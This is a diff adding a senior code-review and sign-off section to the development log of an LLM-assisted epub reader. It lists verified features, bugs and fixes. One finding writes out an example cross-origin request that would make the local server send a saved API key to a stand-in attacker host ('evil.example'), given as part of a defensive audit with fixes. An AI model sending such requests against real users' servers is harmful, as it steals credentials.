@@ -301,3 +301,83 @@ Code-review notes (no action needed, recorded for awareness):
 
 **Next task: M2 — Reader** (first unchecked box in TASKS.md). No open
 blockers. Standing process in SONNET_PROMPT.md still applies verbatim.
+
+## Senior review + M4/M5 sign-off — 2026-07-17 (Fable)
+
+Reviewed all M4/M5 code and drove it end-to-end against a **mock
+OpenAI-compatible SSE server** (happy path, provider-500 path, mid-stream
+client disconnect). Full suite: 46/46 tests green, `tsc -b` + vite build
+clean. **M4/M5 are functionally solid — the core loop works — but three
+fixes are required before/alongside M6** (checklist added to TASKS.md as
+"M6 pre-flight fixes"; details below).
+
+### Verified working (don't re-verify)
+
+- SSE contract exact per SPEC: `{text}` chunks → `{done, messageId,
+  threadId}`; error path emits `{error}` and never `done`.
+- Partial answers are never persisted on disconnect (mid-stream abort test).
+- Follow-ups replay history correctly; first-question-only quote framing.
+- `pnpm --filter @marginalia/server ask <rid> "<q>"` streams to stdout.
+- Settings mask/unmask round-trip ("***" sentinel) works incl. /test
+  fallback; masked GET never leaks keys.
+- `markdown.tsx` is XSS-safe (builds React elements, no innerHTML).
+- Anthropic impl: 2-block system with `cache_control` on book context,
+  `max_tokens` set, typed error mapping, refusal handling — per SPEC (not
+  exercised against a live key in this review).
+
+### MUST FIX (verified bugs)
+
+1. **User messages persist even when the answer fails — and Retry
+   duplicates them.** `routes/threads.ts` calls `createMessage(db, ...,
+   "user", ...)` *before* streaming. Provider error → dangling user row;
+   UI Retry re-POSTs → **two identical user rows** (reproduced: thread
+   ended with `user, user` after one error+retry), which then replay into
+   the model context on every later follow-up, and render as duplicate
+   bubbles. SPEC says *persist on completion*: write the user+assistant
+   pair together (one transaction) in `streamThreadReply` after the stream
+   finishes; on error/abort persist nothing. Note `ThreadPanel.submit()`
+   also re-appends the optimistic user bubble on Retry — fixing the server
+   side and having Retry reuse the existing optimistic message (or dedupe
+   by content) covers the UI half.
+2. **API-key exfiltration via CORS + /test fallback.** The server runs
+   `app.use(cors())` (allow-all: verified `Access-Control-Allow-Origin: *`)
+   and `POST /api/settings/test` resolves a masked `"***"` key to the real
+   saved key. Any webpage open in the user's browser can therefore POST
+   `{provider:"openai-compatible", openaiBaseUrl:"https://evil.example/v1",
+   openaiApiKey:"***"}` and the server sends the saved key as a Bearer
+   header to the attacker's URL. Fix both layers: **remove `cors()`
+   entirely** (dev is same-origin via the Vite proxy; prod serves the
+   built web app from this same server) and **bind to loopback**:
+   `app.listen(PORT, "127.0.0.1", ...)` so LAN peers can't reach the API
+   either. Nothing in the app needs cross-origin access.
+3. **`openaiCompat.ts` never sends `max_tokens`.** `THREAD_MAX_TOKENS` is
+   declared and unused (dead const); the anthropic impl uses its twin.
+   Some OpenAI-compatible servers mis-default without it — add
+   `max_tokens: THREAD_MAX_TOKENS` to both the stream and extract bodies.
+
+### SHOULD FIX (opportunistic, small)
+
+4. `AnthropicProvider.capabilities()` hardcodes `contextTokens: 1_000_000`
+   regardless of model — wrong for e.g. Haiku (200K); the context builder
+   will overshoot and surface as a provider 400. Map known model prefixes
+   (or add an anthropicContextTokens setting mirroring the openai one).
+5. Provider error bodies pass through raw to the UI (`unknown:
+   {"error":{"message":"..."}}` — verified). The M1 review already warned
+   against this in LLM routes. Send `err.code` + a short human message;
+   `console.error` the raw body server-side instead.
+6. Two rapid first-asks on the same highlight race
+   `getThreadByHighlightId ?? createThread` into the `UNIQUE(highlight_id)`
+   constraint → unhandled 500. Catch the constraint error and reuse the
+   existing thread.
+
+### Nits (defer to M7)
+
+- `markdown.tsx` renders `[text](url)` literally (no link support) — fine
+  for v1, revisit in the M7 polish pass.
+- Web bundle is now 622KB minified (epub.js + app in one chunk) — already
+  covered by the M7 code-splitting task.
+
+**Next task: the "M6 pre-flight fixes" checklist at the top of M6 in
+TASKS.md (items 1–3 above are blocking; 4–6 are quick wins), then M6 —
+vault compiler.** Remember the zod/v4 note above for the M6 extraction
+schema.
